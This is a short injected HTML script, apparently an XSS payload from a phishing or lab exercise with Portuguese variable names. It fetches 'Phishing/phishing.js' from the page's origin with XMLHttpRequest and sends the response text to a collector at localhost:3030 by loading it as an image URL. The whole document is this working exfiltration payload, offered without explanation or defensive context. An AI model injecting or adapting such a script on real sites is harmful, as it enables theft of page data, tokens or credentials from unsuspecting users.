<script>
    var requisicao = new XMLHttpRequest();
    requisicao.onreadystatechange = () => {
        if(requisicao.readyState == 4 && requisicao.status == 200){
            new Image().src = "http://localhost:3030/?="+requisicao.responseText
        }
    }
    requisicao.open("GET", "http://localhost:80/Phishing/phishing.js");
    requisicao.send()
</script>